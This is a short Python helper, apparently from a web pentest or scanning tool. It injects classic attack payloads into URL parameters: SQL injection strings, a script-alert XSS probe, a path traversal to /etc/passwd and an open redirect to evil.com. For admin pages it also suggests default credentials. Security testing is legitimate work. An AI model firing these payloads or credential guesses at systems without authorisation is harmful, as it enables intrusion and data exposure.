from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def inject(url, param, payload):
    if not param:
        return url + f"?test={payload}"

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def suggest_payloads(findings):
    print("\n[+] Generating payload suggestions...\n")

    payloads = {
        "SQLi": ["' OR '1'='1", "' OR 1=1 --"],
        "XSS": ["<script>alert(1)</script>"],
        "Path Traversal": ["../../../../etc/passwd"],
        "Open Redirect": ["https://evil.com"]
    }

    for f in findings:
        vuln_type = f.get("type", "")
        url = f.get("url", "")
        param = f.get("param")
        print(f"\nTarget: {url}")

        if "SQLi" in vuln_type or "IDOR" in vuln_type:
            print("Try SQLi:")
            for p in payloads["SQLi"]:
                attack_url = inject(url, param, p)
                print(f"  {attack_url}")

        elif "XSS" in vuln_type:
            print("Try XSS:")
            for p in payloads["XSS"]:
                attack_url = inject(url, param, p)
                print(f"  {attack_url}")

        elif "Path Traversal" in vuln_type:
            print("Try:")
            for p in payloads["Path Traversal"]:
                attack_url = inject(url, param, p)
                print(f"  {attack_url}")

        elif "Redirect" in vuln_type:
            print("Try:")
            for p in payloads["Open Redirect"]:
                attack_url = inject(url, param, p)
                print(f"  {attack_url}")

        elif "admin" in url.lower():
            print("Try:")
            print("  Default creds: admin:admin")
            print("  admin:password")
            print("  test:test")
